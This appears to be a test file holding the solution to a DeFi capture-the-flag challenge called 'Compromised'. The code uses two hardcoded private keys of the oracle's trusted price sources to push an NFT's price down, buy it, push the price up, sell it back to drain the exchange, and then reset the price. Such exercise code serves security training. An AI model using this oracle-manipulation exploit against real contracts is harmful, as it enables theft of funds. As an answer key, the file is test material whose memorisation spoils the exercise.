...
describe("Compromised challenge", function () {
  ...
  it("Execution", async function () {
    ...
    const NEW_NFT_PRICE = 1n * 10n ** 16n;

    trustfulSource1 = new ethers.Wallet(
      "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
      ethers.provider
    );
    trustfulSource2 = new ethers.Wallet(
      "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48",
      ethers.provider
    );

    await oracle.connect(trustfulSource1).postPrice("DVNFT", NEW_NFT_PRICE);
    await oracle.connect(trustfulSource2).postPrice("DVNFT", NEW_NFT_PRICE);

    await exchange.connect(player).buyOne({ value: NEW_NFT_PRICE });

    await oracle
      .connect(trustfulSource1)
      .postPrice("DVNFT", INITIAL_NFT_PRICE + NEW_NFT_PRICE);
    await oracle
      .connect(trustfulSource2)
      .postPrice("DVNFT", INITIAL_NFT_PRICE + NEW_NFT_PRICE);

    await nftToken.connect(player).approve(exchange.address, 0);
    await exchange.connect(player).sellOne(0);

    await oracle.connect(trustfulSource1).postPrice("DVNFT", INITIAL_NFT_PRICE);
    await oracle.connect(trustfulSource2).postPrice("DVNFT", INITIAL_NFT_PRICE);
  });
